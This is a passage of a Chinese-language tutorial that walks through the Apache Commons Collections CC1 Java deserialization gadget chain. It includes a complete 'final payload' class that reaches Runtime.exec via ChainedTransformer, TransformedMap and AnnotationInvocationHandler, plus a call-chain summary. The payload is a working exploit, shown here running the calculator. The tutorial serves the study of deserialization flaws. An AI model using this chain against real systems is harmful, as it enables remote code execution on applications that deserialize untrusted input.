        this.iConstant = constantToReturn;
    }

    public Object transform(Object input) {
        return this.iConstant;
    }

    public Object getConstant() {
        return this.iConstant;
    }
}
```

看 ConstantTransformer 类的 transform 方法会发现：无论传入什么参数，都返回 this.iConstant ，而 iConstant 属性在 ConstantTransformer 的构造方法中被赋值，这个构造方法又被 public 修饰，所以可以直接调用。

那么我们可以将 ConstantTransformer 的 iConstant 属性赋值成 Runtime.class ，然后将其放在 ChainedTransformer 调用链的最上层，这样无论传入什么，ConstantTransformer 的 transform 方法都会返回 Runtime.class 作为下一个 transform 方法的参数。

于是我们得到最终 payload ：

#### 最终 payload

```
public class FinalPayload {
    public static void main(String[] args) throws Exception {
        // 获取包含执行类的 ChainedTransformer 对象
        Transformer[] transformers = new Transformer[]{
                // 将传入参数固定为 Runtime.class
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer
                        ("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer
                        ("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer
                        ("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        // 构造一个 Map 对象，键为 value
        HashMap<Object, Object> map = new HashMap<>();
        map.put("value", "test");

        // 初始化利用链 TransformedMap
        Map<Object, Object> transformedmap = TransformedMap.decorate(map, null, chainedTransformer);

        // 利用反射修改入口类 AnnotationInvocationHandler 的 memberValues 属性
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotationInvocationConstructor = c.getDeclaredConstructor(Class.class, Map.class);
        annotationInvocationConstructor.setAccessible(true);
        // 将有成员属性的 Target.class 传入（也可以用其他的注解类比如 Retention.class）
        Object o = annotationInvocationConstructor.newInstance(Target.class, transformedmap);

        // serialize(o);
        unserialize("ser.bin");
    }

    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
```

### 调用链总结

```
AnnotationInvocationHandler#readObject(ObjectInputStream)
	-> AbstractInputCheckedMapDecorator#entrySet()
	-> AbstractInputCheckedMapDecorator$EntrySet#iterator()
	   AbstractInputCheckedMapDecorator$EntrySetIterator#EntrySetIterator(Iterator,AbstractInputCheckedMapDecorator)
	-> AbstractInputCheckedMapDecorator$EntrySetIterator#next()
	   AbstractInputCheckedMapDecorator$MapEntry#MapEntry(Map.Entry, AbstractInputCheckedMapDecorator)
	-> AbstractInputCheckedMapDecorator$MapEntry#setValue(Object)
	   TransformedMap#checkSetValue(Object)
	   InvokerTransformer#transform(Object) # 调用任意方法
```

### 结语

有时候跳源码看会发现源码晦涩难懂，不如直接调试看结果，根据结果修改输入的参数。

Ref：[https://www.yuque.com/5tooc3a/jas/gggdt0vwi5n0zwhr#IL3zn](https://www.yuque.com/5tooc3a/jas/gggdt0vwi5n0zwhr#IL3zn)
